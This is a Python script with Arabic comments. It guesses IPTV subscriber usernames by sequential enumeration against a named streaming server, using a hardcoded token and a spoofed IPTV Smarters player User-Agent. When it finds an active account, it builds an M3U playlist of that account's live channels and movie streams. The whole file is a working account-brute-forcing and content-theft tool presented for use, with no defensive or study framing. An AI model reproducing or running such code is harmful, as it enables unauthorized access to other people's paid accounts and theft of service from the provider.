import requests

# إعدادات السيرفر والمعلومات الثابتة
SERVER = "http://vipwettbornwet.top:8080"
TOKEN_SECRET = "1260f37e4c58"
CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية المباشرة

# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي
HEADERS = {
    'User-Agent': 'IPTVSmartersPlayer',
    'Accept': '*/*'
}

def check_account(user):
    url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}"
    try:
        response = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=True)
        if response.status_code == 200:
            return True
    except:
        pass
    return False

def get_movie_stream(user, movie_id):
    """جلب رابط الفيلم بناءً على الـ ID المستخرج من اللوغات"""
    # نستخدم نفس منطق الـ API اللي استخرجته أنت
    api_url = f"{SERVER}/api/android/transcoddedFiles/id/{movie_id}?username={user}&password={TOKEN_SECRET}"
    try:
        res = requests.get(api_url, headers=HEADERS, timeout=5).json()
        # نأخذ رابط الـ m3u8 المباشر
        return res[0]['videoUrl']
    except:
        return f"{SERVER}/movie/{user}/{TOKEN_SECRET}/{movie_id}.mp4" # رابط احتياطي

def update_m3u_file(working_user):
    # قائمة IDs لأفلام عشوائية أو جلبها بـ Loop (مثل 3074816 اللي لقيته)
    MOVIE_IDS = ["3074816", "3074810", "3074800"] 

    with open("playlist.m3u", "w", encoding="utf-8") as f:
        f.write("#EXTM3U\n")
        
        # أولاً: القنوات المباشرة
        f.write("\n#--- LIVE CHANNELS ---\n")
        for ch in CHANNELS:
            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" tvg-name="AFG CHANNEL {ch}", AFG CHANNEL {ch}\n')
            f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
            
        # ثانياً: مكتبة الأفلام (VOD)
        f.write("\n#--- CINEMANA MOVIES LIBRARY ---\n")
        for m_id in MOVIE_IDS:
            # هنا السكريبت يروح يجيب الرابط المباشر للفيلم
            movie_link = get_movie_stream(working_user, m_id)
            f.write(f'#EXTINF:-1 group-title="MOVIES LIBRARY", Movie ID: {m_id}\n')
            f.write(f"{movie_link}\n")

    print(f"✅ تم التحديث! يوزر فعال: {working_user} مع مكتبة أفلام.")

def start_fuzzing():
    print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
    for i in range(100, 999):
        target_user = f"VIP016471744476160{i}"
        print(f"🔎 فحص الحساب: {target_user}", end="\r")
        
        if check_account(target_user):
            print(f"\n✨ وجدته! حساب فعال: {target_user}")
            update_m3u_file(target_user)
            return 
            
    print("\n❌ لم يتم العثور على حساب فعال.")

if __name__ == "__main__":
    start_fuzzing()
